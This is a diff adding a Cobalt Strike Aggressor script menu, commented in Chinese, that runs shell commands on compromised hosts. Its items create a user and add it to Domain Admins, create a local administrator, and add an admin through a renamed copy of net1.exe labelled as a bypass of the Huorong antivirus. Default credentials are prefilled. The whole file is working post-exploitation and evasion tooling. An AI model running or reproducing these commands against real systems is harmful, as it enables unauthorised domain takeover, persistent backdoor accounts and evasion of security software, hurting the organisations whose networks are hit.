@@ -1,0 +1,55 @@
+    	menu "添加用户"{
+    			item "添加域管"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("添加域管",%(username => "wafer",passsword => "admin1230.",bid => $bid),&domain_user);
+                    dialog_description($Dialog, "注意下账户策略中:密码复杂度"); #介绍
+                    drow_text($Dialog, "username", "username: ");
+                    drow_text($Dialog, "passsword", "passsword: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+                sub domain_user{
+    				local('$Name');
+    				$Name = $3['username'];
+    				$Pwd = $3['passsword'];
+    				bshell($bid, "net user   $Name   $Pwd /add /domain && net group \"Domain Admins\"  $Name  /add /domain ");				
+				}
+
+
+					item "添加管理员用户"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("添加管理员用户",%(username => "wafer",passsword => "admin1230.","groups" => "administrators", bid => $bid),&workgroup_user);
+                    dialog_description($Dialog, "注意下账户策略中:密码复杂度"); #介绍
+                    drow_text($Dialog, "username", "username: ");
+                    drow_text($Dialog, "passsword", "passsword: ");
+                    drow_text($Dialog, "groups", "用户组: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+                sub workgroup_user{
+    				local('$Name');
+    				$Name = $3['username'];
+    				$Pwd = $3['passsword'];
+    				$groups = $3['groups'];
+    				bshell($bid, "net user   $Name   $Pwd /add  && net localgroup   $groups  $Name  /add");
+				}
+                    item "Bypass火绒添加管理员用户"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("添加管理员用户",%(username => "wafer",passsword => "admin1230.","groups" => "administrators", bid => $bid),&bypass_user);
+                    dialog_description($Dialog, "使用条件:用户权限为system权限"); #介绍
+                    drow_text($Dialog, "username", "username: ");
+                    drow_text($Dialog, "passsword", "passsword: ");
+                    drow_text($Dialog, "groups", "用户组: ");
+                    dbutton_action($Dialog, "运行");
+                    dialog_show($Dialog);
+                }
+                sub bypass_user{
+                    local('$Name');
+                    $Name = $3['username'];
+                    $Pwd = $3['passsword'];
+                    $groups = $3['groups'];
+                    bshell($bid, "cd C:\\Windows\\System32\ && copy net1.exe win.txt /y && win.txt user   $Name   $Pwd /add  && win.txt localgroup   $groups  $Name  /add && del /f /s /q win.txt");
+                }
+	
+
+	}
